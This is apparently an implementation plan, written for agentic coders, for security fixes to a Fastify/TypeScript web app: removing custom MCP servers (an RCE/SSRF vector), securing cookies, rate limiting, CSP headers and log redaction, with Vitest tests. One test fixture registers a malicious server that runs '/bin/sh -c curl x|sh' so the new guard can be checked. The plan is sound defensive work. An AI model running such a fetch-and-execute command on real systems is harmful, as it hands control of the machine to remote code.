# Security & Code-Quality Hardening (#3) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the audit findings on the public Rilo web surface — remove the custom-MCP RCE/SSRF, secure the session cookies, add rate limiting, make de-allowlisting take effect on the web immediately, and apply defense-in-depth headers/handler/redaction.

**Architecture:** Mostly `src/web/*` + two small `src/mcp/*` + `src/log.ts` changes, plus two Fastify plugins (`@fastify/rate-limit`, `@fastify/helmet`). No schema changes. Custom MCP is deleted at the UI/route level *and* neutralized at assembly time by a preset-signature guard (defeats any pre-existing malicious row without a migration).

**Tech Stack:** TypeScript (ESM, Node ≥22), Fastify, better-sqlite3, Vitest.

## Global Constraints

- **Node ≥22, ESM** — every relative import ends in `.js`.
- **Vitest.** Single file: `npx vitest run <path>`. Full suite: `npm test`. Typecheck: `npm run typecheck`.
- **Web test harness:** `buildWebApp({...})` + `app.inject(...)`; a session cookie is minted with `startLogin`→`verifyByToken` (see `tests/web/spaces-route.test.ts` `sessionFor`); crypto is initialized in `beforeAll` via `initCrypto`. Response headers are on `res.headers` (e.g. `res.headers['set-cookie']`).
- **Keep Slack preset + Google OAuth working.** Only *custom* MCP is removed.
- **No behavior change to the audit's Verified-OK items** (SQLi params, IDOR gates, token strength, XSS escaping, encryption, OAuth state).
- **Commit** after each task's tests pass. Conventional Commits.

---

### Task 1: Remove custom MCP + assembly guard (C1 RCE, H1 SSRF)

**Files:**
- Modify: `src/mcp/presets.ts` (drop `custom-http`)
- Modify: `src/web/routes/mcp.ts` (remove `POST /mcp` + the Advanced form)
- Modify: `src/mcp/manager.ts` (skip non-preset servers)
- Test: `tests/mcp/manager.test.ts` (guard), `tests/web/` (route gone) — extend existing or add

**Interfaces:**
- Consumes: `MCP_PRESETS` (`src/mcp/presets.js`), `McpServer` (`src/db/mcp.js`).
- Produces: `assembleMcpTools` now skips any enabled server whose `(transport, command|url-host, args)` does not match a current preset.

- [ ] **Step 1: Write the failing guard test**

Add to `tests/mcp/manager.test.ts` — it already imports `addMcpServer`, `assembleMcpTools`, and provides `db`/`uid` via `beforeEach` (do NOT re-import or re-create them):

```ts
it('skips a non-preset (custom) stdio server — defeats a pre-existing malicious row', async () => {
  // A legit Slack-preset row (matches MCP_PRESETS) + a malicious custom row.
  addMcpServer(db, uid, { name: 'Slack', transport: 'stdio', command: 'npx', args: ['-y', '@modelcontextprotocol/server-slack'] });
  addMcpServer(db, uid, { name: 'evil', transport: 'stdio', command: '/bin/sh', args: ['-c', 'curl x|sh'] });
  const started: string[] = [];
  const makeClient = async (s: any) => { started.push(s.name); return { tools: async () => ({}), close: async () => {} }; };
  await assembleMcpTools({ db, makeClient }, uid);
  expect(started).toEqual(['Slack']); // evil skipped
});
```

**IMPORTANT — the guard will break the pre-existing `manager.test.ts` tests.** They register arbitrary sample servers (e.g. `weather`, `transport:'http', url:'http://x'`) that the new guard now skips → their `tools`/`close` assertions fail. Update each pre-existing test in this file to use a **preset-matching** server so it survives the guard, e.g. replace the sample-server line with:
`addMcpServer(db, uid, { name: 'Slack', transport: 'stdio', command: 'npx', args: ['-y', '@modelcontextprotocol/server-slack'] });`
and adjust any name-based assertions (`weather__forecast` → `Slack__forecast`, etc.) accordingly. The namespacing/close behavior under test is unchanged — only the sample server's shape must match a preset.

- [ ] **Step 2: Run it to verify failure**

Run: `npx vitest run tests/mcp/manager.test.ts`
Expected: FAIL — both servers started (`['Slack','evil']`).

- [ ] **Step 3: Add the preset-signature guard in `manager.ts`**

In `src/mcp/manager.ts`, add near the top (after imports):

```ts
import { MCP_PRESETS } from './presets.js';

function urlHost(u?: string): string {
  try { return u ? new URL(u).host : ''; } catch { return ''; }
}
// A server is allowed only if it matches a shipped preset: same transport, and
// (stdio) same command+args, or (http/sse) same URL host. Creds/tokens vary per
// user and are ignored. This neutralizes any custom row inserted before the
// custom-server form was removed (the RCE/SSRF vector).
function presetSig(transport: string, command: string | undefined, args: string[], url?: string): string {
  return transport === 'stdio'
    ? `stdio|${command ?? ''}|${JSON.stringify(args)}`
    : `${transport}|${urlHost(url)}`;
}
const PRESET_SIGS = new Set(MCP_PRESETS.map((p) => presetSig(p.transport, p.command, p.args ?? [], p.url)));
export function isPresetServer(s: McpServer): boolean {
  return PRESET_SIGS.has(presetSig(s.transport, s.command, s.args, s.url));
}
```

In `assembleMcpTools`, inside the `for (const server of listEnabledMcpServers(...))` loop, before `make(server)`:

```ts
    if (!isPresetServer(server)) {
      console.warn(`MCP server "${server.name}" is not a known preset — skipping (custom servers are disabled).`);
      continue;
    }
```

- [ ] **Step 4: Remove the custom-server route + form**

In `src/web/routes/mcp.ts`:
- Delete the entire `app.post<...>('/mcp', ...)` handler (the free-form custom-server route, ~lines 171-188).
- Delete the `parseCreds` function (only that route used it) — confirm no other reference remains.
- In `renderServicesBody`, delete the `<details><summary>Advanced: connect a custom MCP server manually</summary> … </details>` block (the trailing `<details>…</details>` before the closing `</div>`).

In `src/mcp/presets.ts`: delete the `custom-http` object from `MCP_PRESETS` (keep `slack`).

- [ ] **Step 5: Write the "route gone" test**

Add to `tests/web/mcp-route.test.ts` (or the existing web MCP test file; create with the standard harness if none):

```ts
it('POST /mcp custom-server route is removed', async () => {
  const a = createUserWithIdentity(db, { channel: 'telegram', externalId: 'a', heartbeat_interval_min: 30 });
  setAllowlisted(db, a.id, true);
  const res = await app.inject({ method: 'POST', url: '/mcp', headers: { cookie: sessionFor(a.id) }, payload: { name: 'x', transport: 'stdio', command: '/bin/sh' } });
  expect(res.statusCode).toBe(404); // route no longer exists
});
```

- [ ] **Step 6: Run tests + typecheck + full suite**

Run: `npx vitest run tests/mcp/manager.test.ts tests/web/ && npm run typecheck && npm test`
Expected: PASS. (If `parseCreds`/`custom-http` are referenced elsewhere, typecheck/tests will flag it — remove those refs.)

- [ ] **Step 7: Commit**

```bash
git add src/mcp/presets.ts src/web/routes/mcp.ts src/mcp/manager.ts tests/
git commit -m "fix(security): remove custom MCP form + guard assembly to presets (C1/H1)"
```

---

### Task 2: Auth hardening — secure cookies (M1) + allowlist re-check (M3) + logout POST (L1)

**Files:**
- Modify: `src/web/server.ts` (cookie `secure`, preHandler allowlist check, `POST /logout`)
- Modify: `src/web/routes/oauth.ts` (state cookie `secure`)
- Modify: `src/web/render.ts` (nav "Log out" → POST form)
- Test: `tests/web/` (new `security.test.ts` or extend an existing web test)

**Interfaces:**
- Consumes: `isAllowlisted` (`src/db/users.js`).
- Produces: web session now requires an allowlisted user; both cookies carry `Secure`; logout is POST-only.

- [ ] **Step 1: Write the failing tests**

Create `tests/web/auth-hardening.test.ts` (copy the crypto/`sessionFor` harness from `tests/web/spaces-route.test.ts`):

```ts
import { setAllowlisted } from '../../src/db/users.js';

it('session cookie is Secure + HttpOnly', async () => {
  const a = createUserWithIdentity(db, { channel: 'telegram', externalId: 'a', heartbeat_interval_min: 30 });
  setAllowlisted(db, a.id, true);
  const { token } = startLogin(db, a.id);
  const res = await app.inject({ method: 'GET', url: `/login?token=${token}` });
  const setCookie = String(res.headers['set-cookie']);
  expect(setCookie).toMatch(/Secure/);
  expect(setCookie).toMatch(/HttpOnly/);
});

it('a de-allowlisted user with a valid session is redirected to /login', async () => {
  const a = createUserWithIdentity(db, { channel: 'telegram', externalId: 'a', heartbeat_interval_min: 30 });
  setAllowlisted(db, a.id, true);
  const cookie = sessionFor(a.id);
  expect((await app.inject({ method: 'GET', url: '/', headers: { cookie } })).statusCode).toBe(200);
  setAllowlisted(db, a.id, false);
  const res = await app.inject({ method: 'GET', url: '/', headers: { cookie } });
  expect(res.statusCode).toBe(302);
  expect(res.headers.location).toBe('/login');
});

it('logout is POST-only (GET no longer clears the session)', async () => {
  const a = createUserWithIdentity(db, { channel: 'telegram', externalId: 'a', heartbeat_interval_min: 30 });
  setAllowlisted(db, a.id, true);
  const cookie = sessionFor(a.id);
  expect((await app.inject({ method: 'GET', url: '/logout', headers: { cookie } })).statusCode).toBe(404);
  const res = await app.inject({ method: 'POST', url: '/logout', headers: { cookie } });
  expect(res.statusCode).toBe(302);
  expect(res.headers.location).toBe('/login');
  expect(res.headers['set-cookie']).toBeTruthy(); // clearCookie emits a Set-Cookie that expires the token
});
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run tests/web/auth-hardening.test.ts`
Expected: FAIL — no Secure flag; de-allowlisted user still 200; GET /logout still 302.

- [ ] **Step 3: Implement in `server.ts`**

Add the import:
```ts
import { isAllowlisted } from '../db/users.js';
```

Secure the session cookie (line ~75):
```ts
        reply.setCookie('token', sessionToken, { path: '/', httpOnly: true, sameSite: 'lax', secure: true });
```

Allowlist re-check in the preHandler (after resolving `userId`):
```ts
  app.addHook('preHandler', async (req, reply) => {
    if (PUBLIC_PATHS.has(req.url.split('?')[0]!)) return;
    const token = req.cookies.token;
    const userId = sessionUserId(deps.db, token);
    if (!userId || !isAllowlisted(deps.db, userId)) {
      reply.redirect('/login');
      return reply;
    }
    (req as any).userId = userId;
  });
```

Change logout to POST (replace the `app.get('/logout', …)` block):
```ts
  app.post('/logout', async (_req, reply) => {
    reply.clearCookie('token', { path: '/' });
    reply.redirect('/login');
  });
```

- [ ] **Step 4: Secure the OAuth state cookie**

In `src/web/routes/oauth.ts` (the `reply.setCookie(STATE_COOKIE, …)` call ~line 71), add `secure: true` to the options object (keep `httpOnly`, `sameSite: 'lax'`, `signed`, `maxAge`, `path`).

- [ ] **Step 5: Nav "Log out" → POST form in `render.ts`**

Replace the logout link in the nav (line ~40):
```ts
    : `<nav class="nav">${NAV.map((n) => navLink(n.href, n.label, opts.active === n.key)).join('')}<form method="post" action="/logout" class="nav-logout" style="display:inline"><button type="submit">Log out</button></form></nav>`;
```

- [ ] **Step 6: Run tests + typecheck + full suite**

Run: `npx vitest run tests/web/ && npm run typecheck && npm test`
Expected: PASS. (If other tests logged out via `GET /logout`, update them to `POST`.)

- [ ] **Step 7: Commit**

```bash
git add src/web/server.ts src/web/routes/oauth.ts src/web/render.ts tests/web/auth-hardening.test.ts
git commit -m "fix(security): Secure cookies, web allowlist re-check, POST logout (M1/M3/L1)"
```

---

### Task 3: Rate limiting (M2)

**Files:**
- Modify: `src/web/server.ts` (register `@fastify/rate-limit` globally)
- Modify: `src/web/routes/register.ts` (per-route limit on `POST /register`)
- Modify: `src/web/routes/spaces.ts` (per-route limit on `POST /spaces/redeem`)
- Modify: `package.json` (dep)
- Test: `tests/web/rate-limit.test.ts`

**Interfaces:**
- Produces: a global per-IP cap; tighter caps on `POST /register` and `POST /spaces/redeem` (429 when exceeded).

- [ ] **Step 1: Install the dependency**

Run: `npm install @fastify/rate-limit@^10`
Expected: `package.json` gains `@fastify/rate-limit`. (v10 pairs with Fastify 5.)

- [ ] **Step 2: Write the failing test**

Create `tests/web/rate-limit.test.ts` (standard harness):

```ts
it('POST /register is rate-limited (429 after the cap)', async () => {
  const codes: number[] = [];
  for (let i = 0; i < 8; i++) {
    const res = await app.inject({ method: 'POST', url: '/register', payload: { name: 'x', phone: '123' } });
    codes.push(res.statusCode);
  }
  expect(codes).toContain(429); // cap is 5/min → later requests rejected
});
```

- [ ] **Step 3: Run to verify failure**

Run: `npx vitest run tests/web/rate-limit.test.ts`
Expected: FAIL — all requests succeed (no 429).

- [ ] **Step 4: Register the plugin globally in `server.ts`**

Add the import + registration (after `formbody`):
```ts
import rateLimit from '@fastify/rate-limit';
```
```ts
  await app.register(rateLimit, { global: true, max: 100, timeWindow: '1 minute' });
```

- [ ] **Step 5: Add per-route caps**

In `src/web/routes/register.ts`, on the `app.post('/register', …)` call, add route options:
```ts
  app.post<{ Body: { name?: string; phone?: string } }>(
    '/register',
    { config: { rateLimit: { max: 5, timeWindow: '1 minute' } } },
    async (req, reply) => { /* unchanged body */ },
  );
```

In `src/web/routes/spaces.ts`, on `app.post('/spaces/redeem', …)`:
```ts
  app.post<{ Body: { code?: string } }>(
    '/spaces/redeem',
    { config: { rateLimit: { max: 10, timeWindow: '1 minute' } } },
    async (req, reply) => { /* unchanged body */ },
  );
```

- [ ] **Step 6: Run tests + typecheck + full suite**

Run: `npx vitest run tests/web/ && npm run typecheck && npm test`
Expected: PASS. If any existing web test makes >100 requests to one app instance it could 429 — unlikely; if so, raise the per-test global or split.

- [ ] **Step 7: Commit**

```bash
git add package.json package-lock.json src/web/server.ts src/web/routes/register.ts src/web/routes/spaces.ts tests/web/rate-limit.test.ts
git commit -m "fix(security): add rate limiting (global + tighter on register/redeem) (M2)"
```

---

### Task 4: Security headers (L2) + error handler (L3) + log redaction (L4)

**Files:**
- Modify: `src/web/server.ts` (`@fastify/helmet` + `setErrorHandler`)
- Modify: `src/log.ts` (redaction paths; export `REDACT_PATHS` for testability)
- Modify: `package.json` (dep)
- Test: `tests/web/headers-errors.test.ts`, `tests/log.test.ts`

**Interfaces:**
- Produces: CSP + HSTS + nosniff + frame-deny headers on responses; a generic 500 body on unexpected errors; `creds`/`key`/`api_key` redacted in logs.

- [ ] **Step 1: Install helmet**

Run: `npm install @fastify/helmet@^12`
Expected: `package.json` gains `@fastify/helmet`. (v12 pairs with Fastify 5.)

- [ ] **Step 2: Write the failing tests**

Create `tests/web/headers-errors.test.ts`:
```ts
it('responses carry CSP + HSTS + nosniff headers', async () => {
  const res = await app.inject({ method: 'GET', url: '/login' });
  expect(res.headers['content-security-policy']).toBeTruthy();
  expect(res.headers['strict-transport-security']).toBeTruthy();
  expect(res.headers['x-content-type-options']).toBe('nosniff');
});

it('CSP allows self scripts + inline styles (so htmx + inline <style> work)', async () => {
  const res = await app.inject({ method: 'GET', url: '/login' });
  const csp = String(res.headers['content-security-policy']);
  expect(csp).toMatch(/script-src[^;]*'self'/);
  expect(csp).toMatch(/style-src[^;]*'unsafe-inline'/);
});
```

Create `tests/log.test.ts`:
```ts
import { describe, it, expect } from 'vitest';
import { REDACT_PATHS } from '../src/log.js';
it('redacts credential-bearing keys', () => {
  for (const k of ['creds', '*.creds', 'key', 'api_key']) expect(REDACT_PATHS).toContain(k);
});
```

- [ ] **Step 3: Run to verify failure**

Run: `npx vitest run tests/web/headers-errors.test.ts tests/log.test.ts`
Expected: FAIL — no CSP header; `REDACT_PATHS` not exported.

- [ ] **Step 4: Register helmet + error handler in `server.ts`**

Import + register (after rate-limit):
```ts
import helmet from '@fastify/helmet';
```
```ts
  await app.register(helmet, {
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"], // app injects an inline <style>
        imgSrc: ["'self'", 'data:'],
        baseUri: ["'self'"],
        formAction: ["'self'"],
        frameAncestors: ["'none'"],
        objectSrc: ["'none'"],
      },
    },
    // HSTS on by default; keep it. nosniff + frameguard are helmet defaults.
  });
```

Add an error handler (before returning `app`):
```ts
  app.setErrorHandler((err, req, reply) => {
    const status = err.statusCode && err.statusCode >= 400 && err.statusCode < 500 ? err.statusCode : 500;
    if (status >= 500) log.error({ event: 'web.error', err, url: req.url }, 'unhandled web error');
    reply.status(status).type('text/html').send(
      layout('Error', `<div class="card">${flash('error', status >= 500 ? 'Something went wrong.' : 'Bad request.')}</div>`, { bare: true }),
    );
  });
```
(Add `import { log } from '../log.js';` if not present.)

- [ ] **Step 5: Extend redaction in `log.ts`**

Replace the inline `paths` array with an exported constant and add the credential keys:
```ts
export const REDACT_PATHS = [
  'token', 'phone', 'refresh_token', 'authorization', 'openrouterKey', 'creds', 'key', 'api_key',
  '*.token', '*.phone', '*.refresh_token', '*.authorization', '*.openrouterKey', '*.creds', '*.key', '*.api_key',
];
```
and use `redact: { paths: REDACT_PATHS, censor: '[redacted]' }` in the `pino({...})` call.

- [ ] **Step 6: Run tests + typecheck + full suite**

Run: `npx vitest run tests/web/ tests/log.test.ts && npm run typecheck && npm test`
Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add package.json package-lock.json src/web/server.ts src/log.ts tests/web/headers-errors.test.ts tests/log.test.ts
git commit -m "fix(security): helmet CSP/HSTS, generic error handler, extend log redaction (L2/L3/L4)"
```

---

## Final verification

- [ ] `npm test` — full suite green.
- [ ] `npm run typecheck` — clean.
- [ ] Grep guard: `grep -rn "action=\"/mcp\"" src/web/routes/mcp.ts` returns nothing (custom form gone); `grep -n "custom-http" src/mcp/presets.ts` returns nothing.
- [ ] **Live CSP smoke (controller, before deploy):** run the app locally, log in, load `/mcp` and `/spaces`, trigger an htmx swap (toggle a service / cancel a reminder) and confirm it still works under the CSP (no console CSP violation, swap succeeds). This is the one change with live-behavior risk; the header tests confirm presence but not that htmx functions. If htmx breaks, the fix is almost always `script-src` — re-check it's `'self'` and that htmx is same-origin `/vendor/htmx.min.js` (it is).

## Notes / non-goals

- L5 (npm audit lows → breaking `ai@7`) — deferred.
- Broader CSRF tokens — SameSite=Lax + POST-only mutations is the accepted posture; L1 removes the last state-changing GET.
- The #14 de-allowlist reminder count-burn (scheduler path) is a separate backlog follow-up, not this web pass.
